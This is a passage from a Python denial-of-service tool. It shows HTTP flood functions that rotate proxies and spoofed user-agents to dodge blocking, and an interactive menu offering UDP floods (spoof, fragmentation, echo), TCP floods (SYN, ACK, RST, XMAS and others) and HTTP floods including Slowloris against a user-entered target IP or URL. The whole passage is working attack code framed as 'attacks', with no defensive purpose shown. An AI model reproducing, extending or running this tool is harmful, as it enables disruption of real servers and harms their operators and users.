                print(f"{Fore.YELLOW}[⏰] HEAD timeout {stats.timeouts}{Style.RESET_ALL}")
            except requests.exceptions.ConnectionError:
                stats.increment_timeout()
                print(f"{Fore.YELLOW}[⏰] HEAD connection error (timeout){stats.timeouts}{Style.RESET_ALL}")
            except Exception as e:
                stats.increment_error()
                print(f"{Fore.RED}[❌] HEAD error: {e}{Style.RESET_ALL}")
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[⚠️] Attack interrupted by user{Style.RESET_ALL}")

def http_random_ua_flood(url, duration):
    stats.start()
    end_time = time.time() + duration
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
        "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36"
    ]
    
    print(Fore.CYAN + f"\n[🚀] HTTP Random UA Flood on {url} | {duration}s...")
    print(Fore.YELLOW + "[📝] Real-time stats will appear below:" + Style.RESET_ALL)
    
    stats_thread = threading.Thread(target=stats_display, args=(duration,))
    stats_thread.daemon = True
    stats_thread.start()
    
    try:
        while time.time() < end_time:
            try:
                proxy = random.choice(PROXIES) if PROXIES else None
                proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
                headers = {"User-Agent": random.choice(user_agents)}
                
                response = requests.get(url, headers=headers, proxies=proxies, timeout=1)
                stats.increment_sent()
                ua_short = headers["User-Agent"][:30] + "..."
                proxy_info = f" via proxy {proxy}" if proxy else ""
                print(f"{Fore.GREEN}[✓] Request {stats.sent} sent | UA: {ua_short}{proxy_info} | Status: {response.status_code}{Style.RESET_ALL}")
            except requests.exceptions.Timeout:
                stats.increment_timeout()
                print(f"{Fore.YELLOW}[⏰] Request timeout {stats.timeouts}{Style.RESET_ALL}")
            except requests.exceptions.ConnectionError:
                stats.increment_timeout()
                print(f"{Fore.YELLOW}[⏰] Connection error (timeout) {stats.timeouts}{Style.RESET_ALL}")
            except Exception as e:
                stats.increment_error()
                print(f"{Fore.RED}[❌] Request error: {e}{Style.RESET_ALL}")
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[⚠️] Attack interrupted by user{Style.RESET_ALL}")

def http_proxy_flood(url, duration):
    stats.start()
    end_time = time.time() + duration
    
    print(Fore.CYAN + f"\n[🚀] HTTP Proxy Flood on {url} | {duration}s (Proxies: {len(PROXIES)})...")
    print(Fore.YELLOW + "[📝] Real-time stats will appear below:" + Style.RESET_ALL)
    
    if not PROXIES:
        print(f"{Fore.RED}[❌] No proxies available! Falling back to direct connections.{Style.RESET_ALL}")
    
    stats_thread = threading.Thread(target=stats_display, args=(duration,))
    stats_thread.daemon = True
    stats_thread.start()
    
    try:
        while time.time() < end_time:
            try:
                proxy = random.choice(PROXIES) if PROXIES else None
                proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
                
                response = requests.get(url, proxies=proxies, timeout=1)
                stats.increment_sent()
                proxy_info = f" via proxy {proxy}" if proxy else " (direct)"
                print(f"{Fore.GREEN}[✓] Request {stats.sent} sent{proxy_info} | Status: {response.status_code}{Style.RESET_ALL}")
            except requests.exceptions.Timeout:
                stats.increment_timeout()
                proxy_info = f" via {proxy}" if proxy else ""
                print(f"{Fore.YELLOW}[⏰] Request timeout {stats.timeouts}{proxy_info}{Style.RESET_ALL}")
            except requests.exceptions.ConnectionError:
                stats.increment_timeout()
                proxy_info = f" via {proxy}" if proxy else ""
                print(f"{Fore.YELLOW}[⏰] Connection error (timeout) {stats.timeouts}{proxy_info}{Style.RESET_ALL}")
            except Exception as e:
                stats.increment_error()
                print(f"{Fore.RED}[❌] Request error: {e}{Style.RESET_ALL}")
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[⚠️] Attack interrupted by user{Style.RESET_ALL}")

# Validation Function
def validate_input(prompt, min_val, max_val, input_type=int):
    while True:
        try:
            value = input_type(input(Fore.LIGHTBLUE_EX + prompt))
            if min_val <= value <= max_val:
                return value
            print(Fore.RED + f"[❌] Must be between {min_val} and {max_val}!")
        except ValueError:
            print(Fore.RED + "[❌] Invalid input! Numbers only.")

def main():
    print(ASCII_ART)
    print(Fore.LIGHTBLUE_EX + "🔹 Protocols 🔹")
    print("  1. UDP 🌊")
    print("  2. TCP ⚡")
    print("  3. HTTP/HTTPS 🌐")
    protocol = input(Fore.LIGHTBLUE_EX + "Select protocol (1-3): ").strip()

    if protocol == "1":  # UDP
        print(Fore.LIGHTBLUE_EX + "\n🔹 UDP Methods 🔹")
        print("  1. Plain  2. Random  3. Burst  4. Spoof  5. Frag")
        print("  6. Pulse  7. Echo  8. Multicast")
        method = input(Fore.LIGHTBLUE_EX + "Select method (1-8): ").strip()

        ip = input(Fore.LIGHTBLUE_EX + "Enter server IP: ")
        port = validate_input("Enter port (1-65535): ", 1, 65535)
        duration = validate_input("Enter duration (seconds): ", 1, float('inf'), float)
        packet_size = validate_input("Enter packet size (1-65500): ", 1, 65500)

        methods = {
            "1": udp_plain_flood, "2": udp_random_flood, "3": udp_burst_flood,
            "4": udp_spoof_flood, "5": udp_frag_flood, "6": udp_pulse_flood,
            "7": udp_echo_flood, "8": udp_multicast_flood
        }
        if method in methods:
            methods[method](ip, port, duration, packet_size)
        else:
            print(Fore.RED + "[❌] Invalid UDP method!")

    elif protocol == "2":  # TCP
        print(Fore.LIGHTBLUE_EX + "\n🔹 TCP Methods 🔹")
        print("  1. SYN Single  2. SYN Multi  3. Data Single  4. Data Multi")
        print("  5. ACK  6. RST  7. XMAS  8. FIN  9. PSH  10. Window")
        method = input(Fore.LIGHTBLUE_EX + "Select method (1-10): ").strip()

        ip = input(Fore.LIGHTBLUE_EX + "Enter server IP: ")
        port = validate_input("Enter port (1-65535): ", 1, 65535)
        duration = validate_input("Enter duration (seconds): ", 1, float('inf'), float)
        packet_size = None
        if method in ["3", "4"]:
            packet_size = validate_input("Enter packet size (1-65500): ", 1, 65500)

        if method == "1":
            tcp_syn_flood_single(ip, port, duration)
        elif method == "2":
            tcp_syn_flood_multi(ip, port, duration)
        elif method == "3":
            tcp_data_flood_single(ip, port, duration, packet_size)
        elif method == "4":
            tcp_data_flood_multi(ip, port, duration, packet_size)
        elif method == "5":
            tcp_ack_flood(ip, port, duration)
        elif method == "6":
            tcp_rst_flood(ip, port, duration)
        elif method == "7":
            tcp_xmas_flood(ip, port, duration)
        elif method == "8":
            tcp_fin_flood(ip, port, duration)
        elif method == "9":
            tcp_psh_flood(ip, port, duration)
        elif method == "10":
            tcp_window_flood(ip, port, duration)
        else:
            print(Fore.RED + "[❌] Invalid TCP method!")

    elif protocol == "3":  # HTTP/HTTPS
        print(Fore.LIGHTBLUE_EX + "\n🔹 HTTP/HTTPS Methods 🔹")
        print("  1. GET  2. POST  3. Slowloris  4. HEAD  5. Random UA  6. Proxy")
        method = input(Fore.LIGHTBLUE_EX + "Select method (1-6): ").strip()

        url = input(Fore.LIGHTBLUE_EX + "Enter URL (e.g., http://example.com): ")
        duration = validate_input("Enter duration (seconds): ", 1, float('inf'), float)

        if method == "1":
            http_get_flood(url, duration)
        elif method == "2":
            http_post_flood(url, duration)
        elif method == "3":
            https_slowloris(url, duration)
        elif method == "4":
            http_head_flood(url, duration)
        elif method == "5":
            http_random_ua_flood(url, duration)
        elif method == "6":
            http_proxy_flood(url, duration)
        else:
            print(Fore.RED + "[❌] Invalid HTTP/HTTPS method!")

    else:
        print(Fore.RED + "[❌] Invalid protocol!")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[👋] Program terminated by user{Style.RESET_ALL}")